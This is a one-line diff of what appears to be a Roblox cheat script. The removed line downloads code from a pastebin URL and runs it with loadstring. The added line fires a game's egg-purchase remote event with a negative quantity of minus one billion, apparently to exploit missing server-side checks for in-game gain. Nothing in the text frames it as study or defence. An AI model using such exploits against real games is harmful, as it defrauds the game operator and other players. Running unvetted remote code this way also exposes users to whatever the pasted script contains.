@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://pastebin.com/raw/pkfpwtnn", true))()
+ game:GetService("ReplicatedStorage").Events.BuyEggEvent:FireServer("RandomEgg", -1000000000)
